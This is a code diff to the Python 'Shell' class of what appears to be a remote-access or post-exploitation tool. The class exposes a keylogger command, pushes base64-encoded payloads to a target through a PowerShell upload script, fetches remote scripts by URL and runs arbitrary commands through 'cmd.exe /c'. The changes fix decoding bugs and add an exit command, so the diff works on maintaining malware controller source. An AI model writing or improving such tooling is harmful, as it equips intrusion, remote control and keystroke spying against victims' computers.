@@ -35,7 +35,7 @@ class Shell:
         self.cmds['alias'] = self.set_alias
         self.cmds['background'] = None
         self.cmds['keylogger'] = self.keylogger
-        self.cmds['exit'] = None
+        self.cmds['exit'] = self.exit
         self.alias = Alias()
 
     def get_cmd(self):
@@ -135,7 +135,7 @@ class Shell:
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path).decode()
         else:
-            data = Utils.download_url(path).decode()
+            data = Utils.download_url(path)
 
         if not data == "":
             self.output += self.output_cli_or_str("Fetching %s" % path)
@@ -171,7 +171,7 @@ class Shell:
             return ""
 
         data = ""
-        path = self.alias.get_alias(path)
+        #path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path)
         else:
@@ -182,7 +182,7 @@ class Shell:
 
             data = base64.b64encode(data)
             ps = Utils.load_powershell_script("upload.ps1", 3)
-            ps = Utils.update_key(ps, "PAYLOAD", data)
+            ps = Utils.update_key(ps, "PAYLOAD", data.decode())
             ps = Utils.update_key(ps, "PATH", remote)
             self.output += self.output_cli_or_str("Payload will be saved at %s" % path)
             return ps
@@ -252,3 +252,6 @@ class Shell:
          command = Utils.get_arg_at(self.data, 1, 1)
          self.output += self.output_cli_or_str("Spawning cmd.exe to execute: %s" % command)
          return "cmd.exe /c %s" % command
+
+    def exit(self):
+        return "exit"    
